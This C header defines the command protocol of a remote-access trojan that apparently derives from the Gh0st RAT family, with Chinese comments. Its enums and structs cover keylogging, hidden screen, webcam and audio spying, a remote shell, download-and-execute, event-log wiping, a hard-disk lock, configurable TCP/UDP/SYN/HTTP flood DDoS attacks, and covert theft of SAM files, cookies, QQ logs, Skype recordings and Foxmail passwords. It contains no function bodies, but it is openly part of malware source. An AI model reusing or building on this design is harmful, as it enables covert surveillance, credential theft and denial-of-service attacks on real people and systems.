
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

//#define BUILDDATE "20110622"

#define BUILDDATE "20130902"


// BYTE最大也就256
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x01,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送
	
	// 控制端发出的命令
	COMMAND_ACTIVED = 0x03,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件
	
	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版

	COMMAND_WEBCAM,					// 摄像头
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_NEXT,					// 下一步(控制端已经打开对话框)

	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_KEYBOARD_OFFLINE,		// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容

	COMMAND_AUDIO,					// 语音监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_DIALUPASS,				// 拨号密码
	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）
	COMMAND_REMOVE,					// 卸载后门
	COMMAND_DOWN_EXEC,				// 其它功能 - 下载执行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下载更新
	COMMAND_CLEAN_EVENT,			// 其它管理 - 清除系统日志
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
	COMMAND_RENAME_REMARK,			// 重命名备注
	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
	COMMAND_DDOS,					// DDOS攻击开始
	COMMAND_DDOS_STOP,				// DDOS攻击结束
	COMMAND_HIT_HARD,				//硬盘锁
	COMMAND_OPEN_3389,				//打开3389
	COMMAND_CHAJIAN,				//插件下载
	COMMAND_SERECT_CFG,				//保留，免得以后增加功能又要换版本
	COMMAND_SERECT_CFG_END,
	COMMAND_SERECT_GETSTATE,
	COMMAND_CHAJIAN_FORMIQU,
	COMMAND_SERECT_RESETEND,

	//2.0新加
	COMMAND_PLUGIN_REQUEST,			//插件下载
	
	COMMAND_ONLINE_ERROR,   //add by menglz
	


	// 服务端发出的标识
	TOKEN_AUTH = 101,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN_FALSE,				// 上线包，未验证状态
	TOKEN_LOGIN_TRUE,				// 上线包，已验证状态
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常
	
	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容


	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据
	
	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据

	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
	
	TOKEN_PSLIST,					// 进程列表
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_DIALUPASS,				// 拨号密码
	TOKEN_SHELL_START,				// 远程终端开始

	TOKEN_EVIDENCE_CREATE,			//回传密取数据文件信息
	TOKEN_EVIDENCE_CREATE_ANS,			//回传密取数据文件信息
	TOKEN_EVIDENCE_DATA,			//回传密取文件数据

	TOKEN_EVIDENCE_STATE,			//查看密取状态
	TOKEN_EVIDENCE_CONFIG,			//配置密取项目
	TOKEN_EVIDENCE_RESET,			//密取对象重置
	TOKEN_EVIDENCE_SREECN_ARG,      //自动截屏参数
	COMMAND_SCREEN_CONTINUE,
//	TOKEN_LOGIN_FALSE,	

	//2.0新加
	TOKEN_PLUGIN_REQUEST,			//请求插件下载	
	TOKEN_REPLY_REMOVE,				//卸载的应答，收到后控制端才认为可以卸载了
	

};


#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收数据长度


typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	BOOL			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
	DWORD			SerVer;	
	LPSTR			szCPUID[MAX_PATH];
	char			szCaseID[32];	
	char			szClueID[32];
	char			szLeakID[64];

}LOGININFO;

enum
{
	DDOS_TCP = 10,
	DDOS_UDP,
	DDOS_SYN,
	DDOS_ICMP,
	DDOS_HTTP_GET,
	DDOS_CC
};

typedef struct
{
	BYTE			Flag;
	BYTE			AttackFlag;		// 攻击方式
	char			Domain[100];	// 攻击域名/IP
	char			GetPage[100];
	DWORD			Port;			// 攻击端口
	DWORD			Packs;			// 发包多少(和下一个变量配合)
	DWORD			SleepTime;		// 休息毫秒数
	DWORD			AttackTime;		// 攻击时间,0为不限制
	DWORD			CCAttack_First;	// CC攻击变参的开始
	DWORD			CCAttack_END;	// CC攻击变参的结束
	DWORD			Thread;			// 线程数
}DDOS_DATA;


typedef struct tag_INFOEVIDENCEFILE
{
	CHAR szFileName[MAX_PATH];
	int nFileSize;
}INFOEVIDENCEFILE, *LPINFOEVIDENCEFILE;

typedef struct tag_INFOEVIDENCEFILEANS
{
	BOOL bSucess;
	HANDLE hFile;
}INFOEVIDENCEFILEANS, *LPINFOEVIDENCEFILEANS;

typedef struct tag_INFOEVIDENCEDATA
{
	int nSize;
	BOOL bEnd;
	BYTE pBuf[4096];
}INFOEVIDENCEDATA, *LPINFOEVIDENCEDATA;

//密取类型
typedef enum
{
	SECRET_RECENT		= 0x00000001,		//最近的文件
	SECRET_WEB			= 0x00000002,		//最近的web记录
	SECRET_SKYPE		= 0x00000004,		//Skype的录音
	SECRET_QQLOG		= 0x00000008,		//QQ聊天记录
	SECRET_SAM  		= 0x00000010,		//系统登陆用户SAM文件
	SECRET_SCREEN		= 0x00000020,		//截取屏幕
	SECRET_COOKIES		= 0x00000040,		//获取cookies内容
	SECRET_CLEVERSRC	= 0x00000080,		//触景截屏
	SECRET_FOXMAIL		= 0x00000100,		//foxmail密码获取
}SECRET_GET_TYPE;

typedef enum
{
	ALARMSCREEN_LIUSHUI = 0x00000001,		//键盘输入截屏“流水事件”
	ALARMSCREEN_MINGAN = 0x00000002,		//图防工具截屏“敏感事件”
	ALARMSCREEN_GUANZHU = 0x00000004,		//HTTPS页面或IE代理截屏“关注事件”
}ALARMSCREEN_TYPE;

typedef enum
{
	SECRET_TYPE_START = 0,				//自动
	SECRET_TYPE_STOP,					//停止
};


// 插件参数
struct PLUGPARAMIMP
{
	char chResultPath[MAX_PATH];    //存放插件结果文件的路径，最后以\结尾
	DWORD dwMember1;              
	DWORD dwMember2;
	char szHost[MAX_PATH];			// 主机名
	WORD wPort;						// 端口号
};

// 插件参数
struct PLUGPARAM
{
	PLUGPARAM(){memset(this,0,sizeof(PLUGPARAM));};

	DWORD dwMachineID;				// 机器ID	
	PLUGPARAMIMP imp;
};


// typedef struct 
// {
// 	int nTimeInternal;	//截屏时间间隔
// 	int nBitCount;		//截屏位深
// }INFOSCREEN, *PINFOSCREEN;
// 
// 
// typedef struct
// {
// 	DWORD dwType;
// 	int nCount;
// 	int nAvalible; 
// 	int nCapacity;
// 	//扩展属性（临时）
// 	INFOSCREEN infoScreen;
// 	int nTypeAlarmSrn;
// }INFOSTATE, *PINFOSTATE;


#endif // !defined(AFX_MACROS_H_INCLUDED)




















